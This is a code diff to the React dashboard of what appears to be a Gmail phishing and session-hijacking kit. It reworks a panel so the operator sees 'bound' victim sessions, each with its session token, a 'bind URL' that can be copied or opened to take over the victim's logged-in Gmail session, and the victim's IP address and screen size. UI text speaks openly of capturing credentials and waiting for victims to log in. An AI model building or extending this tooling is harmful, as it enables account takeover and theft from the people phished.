@@ -153,19 +153,15 @@ const Dashboard = () => {
     }
   };
 
-  // Function to check for Gmail browser sessions
+  // Function to check for bound Gmail browser sessions
   const checkGmailSessions = async () => {
     if (!selectedCampaign) return;
     
     try {
-      const response = await httpClient.get('/api/gmail-browser/sessions');
-      // Filter sessions for the selected campaign
-      const campaignSessions = response.data.sessions.filter(
-        session => session.campaignId === selectedCampaign.id
-      );
-      setGmailSessions(campaignSessions);
+      const response = await httpClient.get(`/api/gmail-browser/bound-sessions?campaignId=${selectedCampaign.id}`);
+      setGmailSessions(response.data.sessions || []);
     } catch (error) {
-      console.error("Error fetching Gmail sessions:", error);
+      console.error("Error fetching bound Gmail sessions:", error);
       setGmailSessions([]);
     }
   };
@@ -417,14 +413,14 @@ const Dashboard = () => {
                     <div className="flex items-center justify-between mb-6">
                       <div className="flex items-center space-x-3">
                         <svg className="w-6 h-6 text-cyber-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244" />
                         </svg>
                         <h3 className="text-xl font-semibold text-cyber-primary">
-                          Gmail Browser Sessions
+                          Bound Gmail Sessions
                         </h3>
                         {gmailSessions.length > 0 && (
-                          <div className="badge badge-warning">
-                            {gmailSessions.length} Active
+                          <div className="badge badge-success">
+                            {gmailSessions.length} Bound
                           </div>
                         )}
                       </div>
@@ -443,23 +439,75 @@ const Dashboard = () => {
                     {gmailSessions.length > 0 ? (
                       <div className="space-y-4">
                         {gmailSessions.map((session) => (
-                          <GmailBrowserControl 
-                            key={session.sessionToken}
-                            session={session}
-                            campaignId={selectedCampaign.id}
-                          />
+                          <div key={session.session_token} className="bg-cyber-dark/30 rounded-lg p-4 border border-cyber-primary/20">
+                            <div className="flex items-center justify-between mb-3">
+                              <div className="flex items-center space-x-3">
+                                <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+                                <span className="text-cyber-primary font-medium">
+                                  Session {session.session_token.substring(0, 8)}...
+                                </span>
+                                <div className="badge badge-outline badge-success">
+                                  Logged In
+                                </div>
+                              </div>
+                              <div className="text-xs text-cyber-muted">
+                                {new Date(session.logged_in_at).toLocaleString()}
+                              </div>
+                            </div>
+                            
+                            <div className="mb-3">
+                              <label className="text-sm text-cyber-muted mb-1 block">Bind URL:</label>
+                              <div className="flex items-center space-x-2">
+                                <input 
+                                  type="text" 
+                                  value={session.bind_url} 
+                                  readOnly 
+                                  className="flex-1 bg-cyber-dark/50 border border-cyber-primary/30 rounded px-3 py-2 text-sm text-cyber-primary font-mono"
+                                />
+                                <button
+                                  onClick={() => navigator.clipboard.writeText(session.bind_url)}
+                                  className="glass-button px-3 py-2 rounded text-xs bg-cyber-accent/20 hover:bg-cyber-accent/30"
+                                  title="Copy URL"
+                                >
+                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                  </svg>
+                                </button>
+                                <button
+                                  onClick={() => window.open(session.bind_url, '_blank')}
+                                  className="glass-button px-3 py-2 rounded text-xs bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
+                                  title="Open Session"
+                                >
+                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-2M14 4h6m0 0v6m0-6L10 14" />
+                                  </svg>
+                                </button>
+                              </div>
+                            </div>
+                            
+                            {session.user_info && session.user_info.ip && (
+                              <div className="text-xs text-cyber-muted">
+                                <span>Victim IP: {session.user_info.ip}</span>
+                                {session.user_info.screenWidth && session.user_info.screenHeight && (
+                                  <span className="ml-4">
+                                    Screen: {session.user_info.screenWidth}x{session.user_info.screenHeight}
+                                  </span>
+                                )}
+                              </div>
+                            )}
+                          </div>
                         ))}
                       </div>
                     ) : (
                       <div className="text-center py-8">
                         <svg className="w-16 h-16 text-cyber-muted mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244" />
                         </svg>
                         <h4 className="text-lg font-semibold text-cyber-primary mb-2">
-                          No Gmail Browser Sessions
+                          No Bound Sessions
                         </h4>
                         <p className="text-cyber-muted mb-4">
-                          Create a Gmail browser session to capture credentials in real-time
+                          Create a Gmail session and wait for victims to log in to generate bind URLs
                         </p>
                         <button
                           onClick={createGmailSession}
